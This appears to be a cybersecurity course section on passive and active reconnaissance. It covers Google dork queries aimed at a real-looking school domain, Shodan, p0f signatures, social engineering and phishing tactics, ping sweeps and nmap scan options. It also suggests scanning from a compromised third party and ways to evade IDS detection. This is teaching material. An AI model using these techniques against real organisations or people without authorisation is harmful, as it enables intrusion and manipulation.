Select Historical Snapshots:

Click on a year in the timeline and then select a specific date from the calendar to view an archived version of the website from that date. For example, you might choose a snapshot from 2015 to see how the website appeared ten years ago.
Review the Archived Website:

Analyze the archived pages for information such as:
Company Information: Look for changes in company descriptions, leadership, or contact details.
Products/Services: Note any changes in the products or services offered.
News and Announcements: Check for press releases, news, or updates that may provide insights into the company's history or business focus.


Resources
The Wayback Machine


Instructor Note


6.4.5 Google Searches¶
Google is the most popular internet search engine. However, many people do not realize how robust the searching algorithms are and how they can be used to find sensitive information that can be very valuable when performing passive reconnaissance.

Here are some common Google hacking techniques:

Filetype Search:

Syntax: filetype:
Example: filetype:pdf site:example.com
Purpose: Finds specific file types on a given site.
Site-specific Search:

Syntax: site:
Example: site:example.com
Purpose: Limits the search to a specific website.
Intitle and Inurl Searches:

Syntax: intitle: and inurl:
Example: intitle:"index of" inurl:backup
Purpose: Searches for specific words in the title or URL.
Link Search:

Syntax: link:
Example: link:example.com
Purpose: Finds pages that link to a specified website.
Cache Search:

Syntax: cache:
Example: cache:example.com
Purpose: Displays the cached version of a webpage.
Related Search:

Syntax: related:
Example: related:example.com
Purpose: Finds websites similar to the specified domain.
Wildcard Search:

Syntax: *
Example: site:example.*
Purpose: Uses a wildcard to search across multiple top-level domains.
Combining Operators:

Syntax: OR, - (exclude), + (include)
Example: site:example.com OR site:example.net -inurl:blog
Purpose: Combines operators to refine search results.
Specific File Search:

Syntax: ext:
Example: ext:sql
Purpose: Finds specific file types.


Resources


Instructor Note


6.4.5.1 Identifying sub-domains with Google searches¶

*ccboe.net -site:*.ccboe.net


Resources


Instructor Note


6.4.5.2 Identifying technologies with Google searches¶

site:*.ccboe.net "Powered by"
Many technologies like WordPress (for content management) will tend to have "Powered by" in the page footer.

Job site listings, Linkedin, and other methods may also help find technologies.



Resources


Instructor Note


6.4.6 SHODAN¶
Shodan



Shodan searches can reveal clues about technologies that are exposed with simple searches such as cam, phone, printer, Cisco. It is also useful for exposing remote access services, improperly configured services such as SMB, and network infrastructure.

Once an item of interest is selected, you can obtain copious amounts of information such as open services, banners, location, and applicable CVE vulnerabilities.



Resources


Instructor Note


6.4.7 Passive OS Fingerprinting (p0f)¶
Passive OS Fingerprinter (p0f) is a tool which allows the passive scanning of network traffic. Passive OS fingerprinting focuses on uniqueness in IP and TCP implementations to discover which OS sent the traffic. Specifically, p0f looks at the initial TTL, the fragmentation flag, the default packet length of an IP header, the Windows size, and TCP options in TCP SYN and SYN/ACK packets.

p0f.fp (p0f signature file)

Whenever p0f fingerprints traffic it reads from the p0f.fp file to identify the operating system and other details.

p0f Signature Database:


/etc/p0f/p0f.fp


Resources


Instructor Note
6.4.7.1 Module Specifications¶
Name	Description
module	Name of the fingerprinting module (tcp, http, etc.)
direction	Direction of the traffic, 'request' from client to server or 'response' for server to client.
For the TCP module, 'client' matches initial SYN, and 'server' matches SYN+ACK
Signature Groups

A signature must be preceded by a 'label' describing the fingerprinted information.


label = type:class:name:flavor
Name	Description
type	typically an 's' for specific signatures and 'g' for more generic ones.
class	this provides the distinction between OS-identifying signatures (win, unix, cisco, etc.), if a '!' is indicated, that corresponds to more application-related signatures (NMap, Apache, Mozilla, etc.)
name	human-readable short name for what the fingerprint actually identifies (Linux, MacOS, Internet Explorer, Mozilla)
flavor	This is for any further information that needs to be appended to the label, such as "Xmas Scan" for NMap or version numbers for Linux "2.x"
MTU Signatures

Name	Description
label = Ethernet	self explanatory
sig = 1500	MTU size specification
TCP Signatures


sig = ver:ittl:olen:mss:wsize,scale:olayout:quirks:pclass
TCP Signatures

Name	Description
ver	IP version field. It is 4,6, or * if the version is unimportant to the signature
ittl	initial TTL of the IP packet
olen	IP options length. It is usually 0 for IPv4 and always 0 for IPv6
mss	maximum segment size (mss) that is specified in the TCP options. The * is used to designate that the mss varies
wsize	Windows' size of the TCP segment. This is expressed as a fixed number, a multiple of the mss, or of the MTU. A rare but possible value is *
scale	is the Window scale (ws) value found in TCP options. If the ws option is not found, this value is 0
olayout	this field represents the TCP option types in the order they appear in the packet, separated by commas. When generating a signature for comparison with the database, this field should be the first that is generated. Eight possible options are:
Olayout Options (continued from above)

Name	Description
eol+n	explicit end of options followed by n bytes of padding
nop	No Operation (no-op) option
mss	maximum segment size option
ws	Window scaling option
sok	selective ACK permitted option
sack	selective ACK (rarely ever seen)
ts	timestamp option
?n	unknown option ID
quirks	properties observed in the IP or TCP headers. Two common quirks are df for the don't-fragment flag being set and id+ for when the DF flag is set and the IP identification field is not zero.
pclass	is the payload size of the packet. This is almost always 0, because there is no payload in the three-way handshake.
HTTP signatures

p0f can also determine http signatures based on user agent strings and other information contained within a packet.


sig = ver:horder:habsent:expsw
Name	Description
ver	0, for HTTP/1.0, 1 for HTTP/1.1, or * for any
horder	ordered list of headers that should appear in matching traffic.
habsent	list of headers that must not appear in the matching traffic. Useful for noting the absence of standard headers such as "host"
expsw	expected substrings in the 'user-agent' or 'server' field. This is used to detect dishonest software.


Resources


Instructor Note


6.4.8 Social Tactics¶
Social Tactics is a broad term that governs "people manipulation". This is a practice employed in most marketing today. Its studies human behavior and reactions that many may (or may not) be aware that they are doing. Similar strategies can be used to manipulate an individual into taking certain actions that they may not normally do. Social tactics can be broken down into separate venues which we will discuss individually.



Resources


Instructor Note


6.4.8.1 Social Engineering¶
Social Engineering - hacking the person. Typically involves human-to-human interactions. Can be riskier because you may have to expose your identity.

Friendliness/Liking - Using flattery and friendliness to get what you want. People are easily persuaded by other people that they like. People were more likely to buy if they liked the person selling it to them. Some of the many biases favoring more attractive people are discussed.

Impersonation/Authority - Pretending or pretexting to be another person with the goal of gaining access physically to a system or building. Several impersonation roles fall under the category of someone with authority. People will tend to obey authority figures, even if they are asked to perform objectionable acts.

Conformity/Social Proof - Tendency to see an action as appropriate when others are doing it. People will do things that they see other people are doing.

Decoying/mental buffer-overflow - People are limited in what we can focus our attention on at any moment. Exploit this limitation by distractions to conceal what they are truly seeking.

Diffusion of responsibility - When individuals believe that many others are present or have done a similar act, they as individuals do not bear the full burden of responsibility. It alleviates the stress on the employee and makes it easier for them to comply. "Don't worry, I will call the Police so you don't need to worry about it."

Reverse Social Engineering - Complex questions can yield data. The attacker appears to be in a position of authority. Employees will ask for information.

Components: Sabotage, Advertising, and Assisting. You can break someone's computer while they are out then show up while they are there and pretend to be tech support and ask "I heard someone's computer was not working".
Questions: Language structure that forces the execution of instructions. A person can ask seemingly random questions that may not seem like much but they can be fishing for valuable information.
Job Interview: post a really attractive job position and ensure the link is sent through the target company. If any respond to the ad you can set up an interview to ask questions about setting up security in a network and people tend to divulge details about their own network.
Commitment and consistency - If people commit, orally or in writing, to an idea or goal, they are more likely to honor that commitment because of establishing that idea or goal as being congruent with their self-image. Even if the original incentive or motivation is removed after they have already agreed, they will continue to honor the agreement.

Reciprocity/Quid pro quo - Reciprocity is an expectation that you will treat others the way they treat you. Reciprocity is based on a universal understanding that people give back to others who have given first.

Scarcity/Urgency - Perceived scarcity of an item or time will generate demand.

Sympathy - People want to help others who are in desperate need. Playing the victim in desperate need, crying baby, etc. Sharing of unhappiness or suffering. Implies concern, or a wish to alleviate negative feelings others are experiencing.

Guilt - Feeling of obligation for not pleasing, not helping, or not placating another. Acceptance of responsibility for someone else's misfortune or problem because it is bothersome to see that someone suffers.

Equivocation - An equivocal statement or question starts out sounding reasonable and gets the target to agree to certain ideas or requests by deliberately attempting to create uncertainty or ambiguity. After that, the meaning of key terms is changed, thus causing the victim to agree to things they would have never accepted at the beginning.

Ignorance - Pretending to be uninformed to manipulate a victim to give you information.

Affiliation - Name dropping to establish credibility. Reduces the target's suspicion of the attacker's motives.

Honeytrap - Practice with the use of romantic or sexual relationships for a particular gain.



Resources


Instructor Note


6.4.8.2 Technical based¶
Technical based - utilizes technical means to perform manipulation on a person without needing human-to-human interaction. These can include the use of phones, cell phones, computers, and social media. Less risk because you do not typically expose yourself.

phishing - Phisher sends an e-mail that appears to come from a legitimate business - a bank, or credit card company - requesting "verification" of information and warning of some dire consequence if it is not provided. The e-mail usually contains a link to a fraudulent web page that seems legitimate - with company logos and content - and has a form requesting everything from a home address to an ATM card's PIN or a credit card number.

spear phishing - Although similar to "phishing", spear phishing is a technique that fraudulently obtains private information by sending highly customized emails to few end users. It is the main difference between phishing attacks because phishing campaigns focus on sending out high volumes of generalized emails with the expectation that only a few people will respond.

whaling - similar to spear phishing except the target is a VIP.

vishing - Using a telephone system to gain access to private personal and financial information from the public.

smishing - The act of using SMS text messaging to lure victims into a specific course of action. Like Phishing it can be clicking on a malicious link or divulging information

pharming - Attack intended to redirect a website's traffic to another (fake) site. Pharming can be conducted either by changing the hosts file on a victim's computer or by exploitation of a vulnerability in DNS server software. DNS servers are computers responsible for resolving Internet names into their real IP addresses. Compromised DNS servers are sometimes referred to as "poisoned". Pharming requires unprotected access to target a computer, such as altering a customer's home computer, rather than a corporate business server.

Malvertising - The use of online advertising to spread malware. It typically involves injecting malicious or malware-laden advertisements into legitimate online advertising networks and webpages. Online advertisements provide a solid platform for spreading malware because significant effort is put into them in order to attract users and sell or advertise the product. Because advertising content can be inserted into high-profile and reputable websites, malvertising provides malefactors an opportunity to push their attacks to web users who might not otherwise see the ads, due to firewalls, more safety precautions, or the like. Malvertising is "attractive to attackers because they 'can be easily spread across a large number of legitimate websites without directly compromising those websites'."

Watering Hole - Water holing is a targeted social engineering strategy that capitalizes on the trust users have in websites they regularly visit. The victim feels safe to do things they would not do in a different situation. A wary person might, for example, purposefully avoid clicking a link in an unsolicited email, but the same person would not hesitate to follow a link on a website they often visit. So, the attacker prepares a trap for the unwary prey at a favored watering hole. This strategy has been successfully used to gain access to some (supposedly) very secure systems.

Device Lean Behind (Road Apple) - The hacker leaves a USB drive, CD-RW, phone, or other storage devices around an office and writes a tempting label on it, like salary information or a famous musician (if it's a CD). Oftentimes, if someone finds a USB drive, they'll just start to use it on their own.

Evil Troll - Intentional trolling of social media to antagonize and bait others into conflict. In doing so, the troll may be able to manipulate the victim into revealing sensitive or secret information out of anger or to prove a point.

Rogue Security (Scareware) - A form of malware which impersonates a fake or simulated anti-spyware or security scanner. It tricks you into believing you are getting protection, when in fact you are infecting your network with malware and the social engineer is stealing your data.

Bluetooth

Bluejacking. This is the practice of sending unsolicited messages to nearby Bluetooth devices. Bluejacking messages are typically text, but can also be images or sounds. Bluejacking is relatively harmless, but does cause some confusion when users start receiving messages.

Bluesnarfing. Any unauthorized access to or theft of information from a Bluetooth connection is bluesnarfing. A bluesnarfing attack can access information, such as email, contact lists, calendars, and text messages. Attackers use tools such as hcitool and obexftp.

Bluebugging. Bluebugging attacks allow an attacker to take over a mobile phone. Attackers can listen in on phone conversations, enable call forwarding, send messages, and more.

Car whisperer. The attack takes advantage of a common flaw in Bluetooth vehicle implementation wherein certain car manufacturers use the same 1234 or 0000 passkeys for authentication and encryption. Hackers can use a laptop and a Bluetooth antenna to connect and listen in on hands-free conversations or talk directly to the people in the car. Secure your car's audio, Bluetooth headset, and entertainment system by changing the manufacturer's PIN code.

Location tracking. A Bluetooth attack used for locating and tracking devices. Those usually prone to this attack are fitness enthusiasts because their fitness wearables are always connected to their Bluetooth.

BlueBorne. To perform a BlueBorne attack, hackers need to infect your device with malware. That will allow an attacker to take control of the device. What makes things even worse is that, once your device is infected, it can infect other devices it connects to. If your device's software is outdated and doesn't use a VPN, it is vulnerable to BlueBorne attacks.



Resources


Instructor Note


6.4.8.3 Other Types¶
Other types - These do not typically involve using technical means or human-to-human interaction.

Shoulder Surfing - looking over the victim's shoulders to collect information.

Eavesdropping - It is the process of intercepting unauthorized communication to gather information

Dumpster Diving- looking for treasure in someone else's trash.

Tailgating (piggybacking) - When an unauthorized person physically follows an employee into a restricted corporate area or system.

Baiting - offering something enticing to an end user in exchange for private data. The "bait" comes in many forms, both digital - such as a music or movie download, and physical - such as a branded flash drive labeled "Executive Salary Summary Q3 2017" that is left out on a desk for someone to find. Once the bait is taken, malicious software is delivered directly into the victim's computer.

War Driving/Chalking - identifying open Wi-Fi hotspots.



Resources


Instructor Note


6.5 Describe Methods Used for Active External Discovery¶




Active external discovery involves actively identifying and probing the external-facing assets, systems, and vulnerabilities of an organization or network from an external viewpoint. This is a key component of the reconnaissance phase in cybersecurity assessments, penetration testing, and ethical hacking. In contrast to passive reconnaissance, where information is collected without direct interaction with the target, active external discovery entails the deployment of probes and requests to collect information and pinpoint potential weaknesses.



Resources


Instructor Note


6.5.1 Network Scanning and Banner Grabbing¶
Network scanning is obviously a critical part of reconnaissance, as it allows you to take a look into the hardware structure and software capabilities of a target. One of the main goals is to discern the vulnerabilities of your target, whether it be an adversary or your own organization. Scanning can be approached in several different manners, but here we will focus on it categorically. The biggest difference in this stage compared to passive is that we will now send packets to our target. This greatly increases the chance of discovery.



Resources


Instructor Note


6.5.1.1 Scanning Nature¶
Active - this method aims to provide a comprehensive report of possible open or closed ports at the time of the scan. Active scanning typically performs very fast, and can contain options to vary that speed. However, it is flawed when attempting to detect ports that are filtered by firewalls. A well-known disadvantage of active scanning is that it is very intrusive. Active probes typically solicit a response that would not have been sent otherwise. This traffic is more likely to be detected and logged by the host. In this methodology, packets (whether legal or illegal combinations) will be sent to a target, hence "active". The "stealth" strategies discussed later are still considered active by this definition. in this section, we will focus on active scanning.

Passive - identifies network services by observing traffic generated by servers and hosts as it passes an observation point. Distinctively, passive scanning has the advantage of being non-intrusive. In fact, it generally cannot be detected without in-depth and purposeful investigation. Due to the obscure nature of passive scanning, it can run long-term to better detect active services running on transient hosts such as machines that are frequently powered off or hosts temporarily disconnected from the network. Passive scanning can also detect services that active scanning may miss due to firewall configurations. In this methodology, the service acts more as a sniffer, and no "hard" packet is sent out.



Resources


Instructor Note


6.5.1.2 Scanning Strategy¶
Remote to Local - refers to a remote host, outside the boundary of a specific network, performing some sort of scan on hosts internal to an enterprise network. This is one of the most commonly used pen-testing or attack methods. It is likely to come from unknown external adversaries. This form of scanning is risky and can put defenders on alert. To avoid this you can try methods of scanning to make it not look like a scan. This can be done by scanning random ports over random amounts of time. You can also source the scans from different IP addresses.

Local to Remote - occurs when a host, within the administrative control of an enterprise network, scans systems outside the network boundary. This strategy may cause serious legal issues against an enterprise network without the appropriate permissions since its infrastructure could be used for malicious purposes against Internet systems. This can be ideal for offense. Imagine having a persistance on a 3rd party target that your primary target does business with and perform scans from this 3rd party.

Local to Local - refers to a host that scans systems within the boundaries of an enterprise in which it resides. Local to local scanning activity can occur within or between network subnets and is normally employed by network/security admins per policy. This is common when attackers are on the network and are trying to discover other hosts and perform lateral movement.

Remote to Remote - does not depend on certain boundaries. It mainly refers to worldwide scanning campaigns. Rather than focusing on a specific network as a target, it aims at probing and exploiting the Internet's services vices. This strategy is often distributed, possesses sophisticated stealth capabilities, and is typically highly coordinated.



Resources


Instructor Note


6.5.1.3 Scanning Approach¶
Aim

Wide Target Scanning:

Scope: Wide target scanning involves scanning a broad range of IP addresses or a large network segment.
Purpose: The primary goal of wide target scanning is to gather information about a large number of systems within a network or across the internet.
Approach: Wide target scanning typically involves using scanning tools like Nmap, Masscan, or Shodan to sweep through a wide range of IP addresses, identifying active hosts, open ports, and potentially vulnerable services.
Advantages:
Provides a comprehensive overview of the network landscape.
Helps identify potential entry points and weak spots across a large network.
Challenges:
Generates a large volume of data that may require extensive analysis.
May result in network congestion or trigger security alerts if performed without proper authorization.
Target-Specific Scanning:

Scope: Target-specific scanning focuses on a specific set of IP addresses or a particular subset of systems within a network.
Purpose: The goal of target-specific scanning is to gather detailed information about specific systems or assets of interest.
Approach: Target-specific scanning involves selecting specific IP addresses or systems based on predefined criteria, such as criticality, importance, or suspicion of vulnerability. The scanning is tailored to gather detailed information relevant to the selected targets.
Advantages:
Allows for a more focused and efficient use of resources.
Provides in-depth information about specific systems or assets of interest.
Challenges:
Requires prior knowledge or intelligence about the target to select appropriate systems for scanning.
May overlook potential vulnerabilities or entry points in other parts of the network.
Method

Single Source Scan.
A single source scan is conducted from one centralized scanning system or node. This system is responsible for sending out all scanning requests and collecting results.
Characteristics:
Centralized Execution: All scanning activities are performed by one machine, which means the scanning software runs from a single point.
Simplicity: Easier to set up and manage since it involves only one system.
Resource Constraints: Limited by the capacity and performance of the single scanning system. High traffic or complex scans may impact performance or result in incomplete scans.
Network Impact: Can generate significant traffic from one source, potentially causing network congestion or performance issues.
Scalability: Less scalable compared to distributed scanning; may not be suitable for very large networks or environments with high complexity.
Detection: May be less effective at detecting distributed or segmented vulnerabilities since it scans from a single vantage point.
Risk: Scanning traffic originates from a single IP address, which can be more easily detected and flagged by intrusion detection systems (IDS) or intrusion prevention systems (IPS).
Scan	Description	Example
Vertical scan	Consists of a port scan of some (or all ports) on a single target.	
Horizontal scan	Scan a single (or set) port(s) on a range of targets.	
Strobe scan	Scan a predefined subset of ports on a range of targets.	
Block scan	Scan all (or a range) ports on a range of targets.	
Distributed Scan:
A distributed scan uses multiple scanning systems or nodes to perform scanning activities. These systems work together to cover larger or more complex networks.
Reduces the scanning footprint of any single system and thus decreases the likelihood of being detected.
Characteristics:
Decentralized Execution: Scanning is performed by multiple systems, each potentially covering different segments of the network.
Complexity: More complex to set up and manage due to the coordination between multiple scanning systems.
Resource Utilization: Can leverage the resources of multiple systems, improving performance and allowing for more extensive or intensive scanning.
Network Impact: Distributes traffic across multiple sources, reducing the likelihood of congestion or performance degradation on any single part of the network.
Scalability: Highly scalable; can efficiently handle large, distributed, or complex networks.
Detection: Better at identifying vulnerabilities in segmented or complex network environments due to the ability to scan from multiple points.
Risk: Scanning traffic is spread across multiple IP addresses, making it more challenging for the target network to detect and block the scanning activity as a whole.
1. Each system performs a thorough Vertical scan across a determined range of target hosts.	
2. Each system is designated specific ports to scan across all target hosts.	


Resources


Instructor Note


6.5.1.4 Service Discovery (Port Scanning)¶
Service Discovery sends TCP or UDP packets to hosts on specific ports. This method queries which hosts are up and which sockets are bound. Because it is most likely that multiple packets are sent to multiple hosts, these techniques are very noticeable on the network unless a large amount of time (low and slow) is taken while completing these scans. For purposes intended to avoid detection, "stealth scans" can be employed. These techniques attempt to avoid filtering devices by using alternative sets of flag combinations to appear as legitimate traffic.

The most common methods of port scanning are SYN scans and TCP Full Connect Scans, with the first considered to be "stealth". Other types of "stealth" scans will be explored later in this section.



Resources


Instructor Note


6.5.2 PING¶
Active External Network Reconnaissance: Scans with FPING or PING

Broadcast Ping

A broadcast ping sends an ICMP echo request to the network broadcast address. Send one ICMP packet that every host receives and all active hosts should respond. Most systems no longer respond to a broadcast ping.
Using ping and ping sweep

A Ping or ping sweep sends an ICMP echo request (icmp type 8) to one or many usable address on a network. It waits to receive a ICMP echo repy (icmp type 0) from active devices. If used, there should be a delay between pings, and hosts pinged should not be sequential.

This is effective if there are no firewalls, but it is very noisy. It is common for firewalls to block ICMP echo requests/replys. If this is the case, then using only ping for reconnaissance will give actors conducting the recon false information thinking there are no other active hosts on the network. Many modern OS's like Windows 7 drop an ICMP Echo Request by default for security reasons.

A ping sweep in IPv6 is infeasible because there are too many addresses in a typical /64 network.


ping [options] destination
Options:
-c count: Specify the number of packets to send (e.g., ping -c 4 will send four packets).
-i interval: Specify the interval between packets in seconds.
-t timeout: Specify the maximum time to wait for a response.
-s packetsize: Specify the size of the data portion of the packet.
-q Quiet output: Displays only summary information at the end.
-W timeout: Similar to -t, this option specifies the timeout in seconds but is supported on some systems instead of -t.
-f Flood ping: Sends a large number of packets rapidly for testing network performance.
-v Verbose output: Displays detailed information about each packet.
-p specify a pattern (in hex) to be sent in the ICMP echo request packets.
Ping sweep

-c (--count *count*) - Stop after sending (and receiving) count.


for i in {1..254}; do (ping -c 1 192.168.65.$i | grep "bytes from" &) ; done
Using FPING:

-g (--generate) 172.16.82.96/27 - Generate a target list from a supplied IP netmask, or a starting and ending IP.
-a (--alive) - Show systems that are alive.


fping -g -a 10.1.0.0/24
Using NMAP:

-sn: Ping Scan - disable port scan


nmap -sn 10.0.0.0/24 (was -sP which is now deprecated)


Resources


Instructor Note


6.5.3 NMAP¶
Active External Network Reconnaissance: Scans with NMAP

NMAP (Network Mapper) is a popular open source tool for network discovery, exploration and security auditing. NMAP is a command line tool but has a Graphical User Interface (GUI) version call ZENMAP that comes installed when NMAP is installed.

Nmap.org

The default scanning method depends on whether the scan is executed as a user or root. When conducted as a user, the default scan employs a TCP full connect (-sT) as creating RAW SOCKETS, required for other scans, necessitates permissions that a user typically lacks. On the other hand, when executed as a root user, the default scan type is a SYN Scan (-sS). Regardless of the chosen scan method, if specific ports are not designated, NMAP will automatically scan the 1000 most commonly used TCP or UDP ports.

User Default: TCP Full Connect Scan (-sT)
Root Default: TCP SYN Scan (-sS)
Default Ports scanned: 1000 most commonly used TCP or UDP ports.

nmap -v -oG - | grep "Ports scanned"
This list comes from the /usr/share/nmap/nmap-services file based on the frequency of detection.

sort -r -k3 /usr/share/nmap/nmap-services | less
grep /tcp /usr/share/nmap/nmap-services | sort -r -k3 | less 
grep /udp /usr/share/nmap/nmap-services | sort -r -k3 | less


Resources


Instructor Note


6.5.3.1 NMAP Port States¶
When NMAP starts its port discovery the result can be one of six states: open, closed, filtered, unfiltered, open|filtered, or closed|filtered.

The six port states recognized by Nmap:

open - An application is actively accepting TCP connections, UDP datagrams or SCTP associations on this port. Open TCP ports are determined by receiving a SYN/ACK response while no response is common for UDP open ports. Finding these is often the primary goal of port scanning. Security-minded people know that each open port is an avenue for attack. Attackers and pen-testers want to exploit the open ports, while administrators try to close or protect them with firewalls without thwarting legitimate users. Open ports are also interesting for non-security scans because they show services available for use on the network.

closed - A closed port is accessible (it receives and responds to Nmap probe packets), but there is no application listening on it. This is typically determined by receiving a RST flag on TCP ports or an ICMP Destination unreachable, Destination port unreachable (Type 3 Code 3) on a UDP port. They can be helpful in showing that a host is up on an IP address (host discovery, or ping scanning), and as part of OS detection. Because closed ports are reachable, it may be worth scanning later in case some open up. Administrators may want to consider blocking such ports with a firewall. Then they would appear in the filtered state, discussed next.

filtered - Nmap cannot determine whether the port is open because packet filtering prevents its probes from reaching the port. If a RST or ICMP message was not received from the probed port then it can be assumed that the port may be filtering these probes. The filtering could be from a dedicated firewall device, router rules, or host-based firewall software. These ports frustrate attackers because they provide so little information. Sometimes they respond with ICMP error messages such as type 3 code 13 (destination unreachable: communication administratively prohibited), but filters that simply drop probes without responding are far more common. This forces Nmap to retry several times just in case the probe was dropped due to network congestion rather than filtering. This slows down the scan dramatically.

unfiltered - The unfiltered state means that a port is accessible, but Nmap is unable to determine whether it is open or closed. Only the ACK scan, which is used to map firewall rulesets, classifies ports into this state. Scanning unfiltered ports with other scan types such as Window scan, SYN scan, or FIN scan, may help resolve whether the port is open.

open|filtered - Nmap places ports in this state when it is unable to determine whether a port is open or filtered. This occurs for scan types in which open ports give no response. The lack of response could also mean that a packet filter dropped the probe or any response it elicited. So Nmap does not know for sure whether the port is open or being filtered. The UDP, IP protocol, FIN, NULL, and Xmas scans classify ports this way.

closed|filtered - This state is used when Nmap is unable to determine whether a port is closed or filtered. It is only used for the IP ID idle scan.



Resources


Instructor Note


6.5.3.2 NMAP Options¶
TARGET SPECIFICATION:

Can pass hostnames, IP addresses, networks, etc.
Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254
-iL <inputfilename>: Input from list of hosts/networks
-iR <num hosts>: Choose random targets
--exclude <host1[,host2][,host3],...>: Exclude hosts/networks
--excludefile <exclude_file>: Exclude list from file
HOST DISCOVERY:

-sL: List Scan - simply list targets to scan
-sn: Ping Scan - disable port scan
-Pn: Treat all hosts as online -- skip host discovery
-PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports
-PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes
-PO[protocol list]: IP Protocol Ping
-n/-R: Never do DNS resolution/Always resolve [default: sometimes]
--dns-servers <serv1[,serv2],...>: Specify custom DNS servers
--system-dns: Use OS's DNS resolver
--traceroute: Trace hop path to each host
SCAN TECHNIQUES:

-sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
-sU: UDP Scan
-sN/sF/sX: TCP Null, FIN, and Xmas scans
--scanflags <flags>: Customize TCP scan flags
-sI <zombie host[:probeport]>: Idle scan
-sY/sZ: SCTP INIT/COOKIE-ECHO scans
-sO: IP protocol scan
-b <FTP relay host>: FTP bounce scan
PORT SPECIFICATION AND SCAN ORDER:

-p <port ranges>: Only scan specified ports
Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9
--exclude-ports <port ranges>: Exclude the specified ports from scanning
-F: Fast mode - Scan fewer ports than the default scan
-r: Scan ports sequentially - don't randomize
--top-ports <number>: Scan <number> most common ports
--port-ratio <ratio>: Scan ports more common than <ratio>
SERVICE/VERSION DETECTION:

 -sV: Probe open ports to determine service/version info
--version-intensity <level>: Set from 0 (light) to 9 (try all probes)
--version-light: Limit to most likely probes (intensity 2)
--version-all: Try every single probe (intensity 9)
--version-trace: Show detailed version scan activity (for debugging)
SCRIPT SCAN:

-sC: equivalent to --script=default
--script=<Lua scripts>: <Lua scripts> is a comma separated list of
    directories, script-files or script-categories
--script-args=<n1=v1,[n2=v2,...]>: provide arguments to scripts
--script-args-file=filename: provide NSE script args in a file
--script-trace: Show all data sent and received
--script-updatedb: Update the script database.
--script-help=<Lua scripts>: Show help about scripts.
    <Lua scripts> is a comma-separated list of script-files or
     script-categories.
OS DETECTION:

-O: Enable OS detection
--osscan-limit: Limit OS detection to promising targets
--osscan-guess: Guess OS more aggressively
TIMING AND PERFORMANCE:

Options which take <time> are in seconds, or append 'ms' (milliseconds),
's' (seconds), 'm' (minutes), or 'h' (hours) to the value (e.g. 30m).
-T<0-5>: Set timing template (higher is faster)
--min-hostgroup/max-hostgroup <size>: Parallel host scan group sizes
--min-parallelism/max-parallelism <numprobes>: Probe parallelization
--min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout <time>: Specifies
    probe round trip time.
--max-retries <tries>: Caps number of port scan probe retransmissions.
--host-timeout <time>: Give up on target after this long
--scan-delay/--max-scan-delay <time>: Adjust delay between probes
--min-rate <number>: Send packets no slower than <number> per second
--max-rate <number>: Send packets no faster than <number> per second
FIREWALL/IDS EVASION AND SPOOFING:

-f; --mtu <val>: fragment packets (optionally w/given MTU)
-D <decoy1,decoy2[,ME],...>: Cloak a scan with decoys
-S <IP_Address>: Spoof source address
-e <iface>: Use specified interface
-g/--source-port <portnum>: Use given port number
--proxies <url1,[url2],...>: Relay connections through HTTP/SOCKS4 proxies
--data <hex string>: Append a custom payload to sent packets
--data-string <string>: Append a custom ASCII string to sent packets
--data-length <num>: Append random data to sent packets
--ip-options <options>: Send packets with specified ip options
--ttl <val>: Set IP time-to-live field
--spoof-mac <mac address/prefix/vendor name>: Spoof your MAC address
--badsum: Send packets with a bogus TCP/UDP/SCTP checksum
OUTPUT:

-oN/-oX/-oS/-oG <file>: Output scan in normal, XML, s|<rIpt kIddi3,
    and Grepable format, respectively, to the given filename.
-oA <basename>: Output in the three major formats at once
-v: Increase verbosity level (use -vv or more for greater effect)
-d: Increase debugging level (use -dd or more for greater effect)
--reason: Display the reason a port is in a particular state
--open: Only show open (or possibly open) ports
--packet-trace: Show all packets sent and received
--iflist: Print host interfaces and routes (for debugging)
--append-output: Append to rather than clobber specified output files
--resume <filename>: Resume an aborted scan
--noninteractive: Disable runtime interactions via keyboard
--stylesheet <path/URL>: XSL stylesheet to transform XML output to HTML
--webxml: Reference stylesheet from Nmap.Org for more portable XML
--no-stylesheet: Prevent associating of XSL stylesheet w/XML output
MISC:

-6: Enable IPv6 scanning
-A: Enable OS detection, version detection, script scanning, and traceroute
--datadir <dirname>: Specify custom Nmap data file location
--send-eth/--send-ip: Send using raw ethernet frames or IP packets
--privileged: Assume that the user is fully privileged
--unprivileged: Assume the user lacks raw socket privileges
-V: Print version number
-h: Print this help summary page.


Resources


Instructor Note


6.5.3.3 NMAP Scan Types¶


Resources


Instructor Note


6.5.3.3.1 SYN Scan¶
SYN scan sends only one TCP packet with the SYN flag set to each destination port and waits for a SYN/ACK or RST. This is also known as a Stealth Scan. This method reports if there is an application listening on the target port and does not register on the host system, because no ACK is sent to the target. This method does not retrieve any information about the service.


nmap -sS 172.16.82.106
hping3 172.16.82.106 -S -V -p 443
TCP Three-Way Handshake:

In a typical TCP connection, a three-way handshake occurs:
The scanning tool (Nmap) sends a SYN (synchronize) packet to the target port.
If the port is open and accepting connections, the target system responds with a SYN-ACK (synchronize-acknowledge) packet.
Finally, the scanning tool sends an ACK (acknowledge) packet to complete the connection setup.
Packet Generation:

In a TCP SYN scan, Nmap sends SYN packets to the target ports to initiate a connection.
Unlike a TCP Full Connect scan, it does not complete the three-way handshake by sending an ACK packet after receiving a SYN-ACK response.
Target Response:

If the target port responds with a SYN-ACK packet, indicating that the port is open and accepting connections, Nmap does not complete the connection setup.
If the port is closed or filtered (firewalled), the target system typically responds with an RST (reset) packet to indicate that the connection cannot be established.
Interpreting Results:

If Nmap receives a SYN-ACK packet in response to the SYN packet, it marks the port as open.
If Nmap receives an RST packet in response to the SYN packet, it marks the port as closed.
If Nmap does not receive any response, it typically indicates that the port is filtered (firewalled).
Use Cases:

TCP SYN scans are fast and stealthy, making them suitable for scanning large numbers of ports quickly.
They are commonly used for reconnaissance to identify open ports and potentially vulnerable services on target systems.
TCP SYN scans are less likely to be logged and detected compared to TCP Full Connect scans because they do not complete the TCP connection setup.
NOTE: SYN scan is the default scan type when running as the root user.



Resources


Instructor Note


6.5.3.3.2 Full Connect Scan¶
